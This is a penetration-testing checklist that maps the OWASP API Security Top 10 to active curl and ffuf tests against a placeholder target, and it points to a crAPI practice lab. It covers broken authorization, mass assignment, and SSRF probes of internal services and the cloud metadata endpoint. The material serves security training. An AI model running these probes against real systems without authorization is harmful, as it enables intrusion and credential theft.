# OWASP ASVS and API Security Top 10 as an Enumeration Checklist

Use these as structured test checklists during webapp enumeration. Not theory — run each check actively.

## ASVS Levels

- L1: Opportunistic attacker, basic checks
- L2: Standard security verification
- L3: High-value targets, advanced verification

For OSCP-level testing, L1 and L2 cover most findings.

## OWASP API Security Top 10 — Active Test Checklist

**API1: Broken Object Level Authorization (BOLA)**

```bash
# Find an endpoint that takes an object ID
GET /api/users/1001/profile
# Change ID to another user's ID
GET /api/users/1002/profile
# Did you get another user's data? BOLA.
```

**API2: Broken Authentication**

```bash
# Test auth endpoints:
curl -X POST -d '{"user":"admin","pass":"admin"}' http://target/api/login
# Try: no password, empty token, expired token, invalid JWT signature
curl -H "Authorization: Bearer invalid.token.here" http://target/api/profile
```

**API3: Broken Object Property Level Authorization (Mass Assignment)**

```bash
# Add unexpected fields to POST body:
curl -X POST -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass","role":"admin","isAdmin":true}' \
  http://target/api/register
```

**API4: Unrestricted Resource Consumption**

```bash
# Send 50 rapid requests — does the server rate limit?
for i in {1..50}; do curl -s -o /dev/null -w "%{http_code}\n" http://target/api/search?q=test; done
```

**API5: Broken Function Level Authorization**

```bash
# Try admin endpoints as regular user:
curl -H "Authorization: Bearer USER_TOKEN" http://target/api/admin/users
curl -H "Authorization: Bearer USER_TOKEN" http://target/api/admin/delete/1
```

**API7: Server-Side Request Forgery (SSRF)**

```bash
# Find URL parameters and point them at internal resources:
curl "http://target/api/fetch?url=http://127.0.0.1:6379/"
curl "http://target/api/fetch?url=http://169.254.169.254/latest/meta-data/"
```

**API8: Security Misconfiguration**

```bash
# Check for debug/info endpoints:
curl http://target/api/debug
curl http://target/api/health
curl http://target/swagger.json
curl http://target/openapi.json
curl http://target/api-docs
# Check verbose error messages:
curl -X POST -d "invalid" http://target/api/login
```

**API9: Improper Inventory Management**

```bash
# Check for old API versions:
curl http://target/api/v1/users
curl http://target/api/v2/users
curl http://target/v1/
ffuf -u http://target/FUZZ/users -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

## Practice Lab

OWASP crAPI Docker lab covers all 10 API vulnerabilities:

```bash
docker pull crapi/crapi
docker-compose -f docker-compose.yml --compatibility up -d
# Access at http://localhost:8888
```

Complete all crAPI challenges before attempting HTB or TryHackMe API rooms.
